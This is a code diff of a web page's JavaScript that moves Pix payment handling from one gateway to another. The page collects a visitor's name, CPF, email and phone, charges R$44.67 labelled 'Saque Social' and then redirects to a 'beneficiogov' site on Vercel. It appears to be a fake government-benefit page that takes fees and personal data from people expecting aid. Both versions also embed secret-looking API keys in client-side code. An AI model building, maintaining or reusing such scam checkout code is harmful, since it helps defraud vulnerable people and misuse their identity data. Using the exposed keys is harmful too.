@@ -311,8 +311,8 @@ document.head.appendChild(a);
 
 <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async defer></script>
 <script>
-  var BLACKCAT_API_URL  = 'https://api.blackcatpay.com.br/api';
-  var BLACKCAT_API_KEY  = 'sk_live_61ab2d43146721659324096a00d68c11f784242367a8469dae090c9ddf0c07d8';
+  var PARADISE_API_URL  = 'https://multi.paradisepags.com/api/v1';
+  var PARADISE_API_KEY  = 'sk_220715873acbf9718fdd92d1d08b541320f5c7c711b5017be8cb91edc9192bdf';
   var PIX_VALOR_CENTS   = 4467;
   var PIX_DESCRICAO     = 'Saque Social';
   var PIX_REDIRECT      = 'https://beneficiogov.vercel.app/up1.html';
@@ -351,12 +351,24 @@ document.head.appendChild(a);
       var cpfEnvio=_cpf.replace(/\D/g,'');
       var emailEnvio=_email&&_email.indexOf('@')>0?_email:'pagador@gmail.com';
       var foneEnvio=(_fone||'11999999999').replace(/\D/g,'');
-      var payload={amount:PIX_VALOR_CENTS,currency:'BRL',paymentMethod:'pix',items:[{title:PIX_DESCRICAO,unitPrice:PIX_VALOR_CENTS,quantity:1,tangible:false}],customer:{name:nomeEnvio,email:emailEnvio,phone:foneEnvio,document:{number:cpfEnvio,type:'cpf'}},pix:{expiresInDays:1}};
-      var res=await fetch(BLACKCAT_API_URL+'/sales/create-sale',{method:'POST',headers:{'Content-Type':'application/json','X-API-Key':BLACKCAT_API_KEY},body:JSON.stringify(payload)});
+      var referencia='SS-'+Date.now()+'-'+Math.floor(Math.random()*9000+1000);
+      var payload={
+        amount: PIX_VALOR_CENTS,
+        description: PIX_DESCRICAO,
+        reference: referencia,
+        source: 'api_externa',
+        customer:{
+          name: nomeEnvio,
+          email: emailEnvio,
+          phone: foneEnvio,
+          document: cpfEnvio
+        }
+      };
+      var res=await fetch(PARADISE_API_URL+'/transaction.php',{method:'POST',headers:{'Content-Type':'application/json','X-API-Key':PARADISE_API_KEY},body:JSON.stringify(payload)});
       var data=await res.json();
-      if(!res.ok||!data.success||!data.data||!data.data.paymentData||!data.data.paymentData.copyPaste)throw new Error('Erro');
-      _pixTxid=data.data.transactionId;
-      _pixCode=data.data.paymentData.copyPaste;
+      if(!res.ok||data.status!=='success'||!data.qr_code)throw new Error('Erro');
+      _pixTxid=data.transaction_id;
+      _pixCode=data.qr_code;
       var valorFmt='R$ '+(PIX_VALOR_CENTS/100).toFixed(2).replace('.',',');
       document.getElementById('pix-nome-show').textContent=nomeOk||'Cliente';
       document.getElementById('pix-cpf-show').textContent=_cpf?formatarCPF(_cpf):'---';
@@ -365,7 +377,7 @@ document.head.appendChild(a);
       document.getElementById('pix-code-box').textContent=_pixCode;
       var wrap=document.getElementById('pix-qr-img');wrap.innerHTML='';
       var imgEl=document.createElement('img');
-      var b64=data.data.paymentData.qrCodeBase64;
+      var b64=data.qr_code_base64;
       imgEl.src=b64?(b64.startsWith('data:image')?b64:'data:image/png;base64,'+b64):'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(_pixCode);
       imgEl.style.cssText='border-radius:8px;max-width:190px;';
       wrap.appendChild(imgEl);_pixQRFeito=true;
@@ -384,9 +396,9 @@ document.head.appendChild(a);
     _pixTimer=setInterval(async function(){
       tentativas++;if(tentativas>180){clearInterval(_pixTimer);return;}
       try{
-        var r=await fetch(BLACKCAT_API_URL+'/sales/'+encodeURIComponent(_pixTxid)+'/status',{headers:{'X-API-Key':BLACKCAT_API_KEY}});
+        var r=await fetch(PARADISE_API_URL+'/query.php?action=get_transaction&id='+encodeURIComponent(_pixTxid),{headers:{'X-API-Key':PARADISE_API_KEY}});
         var s=await r.json();
-        if(s.success&&s.data&&s.data.status==='PAID'){
+        if(s.status==='approved'){
           clearInterval(_pixTimer);
           ttqPurchase();
           setTimeout(function(){ window.location.href=PIX_REDIRECT; },800);
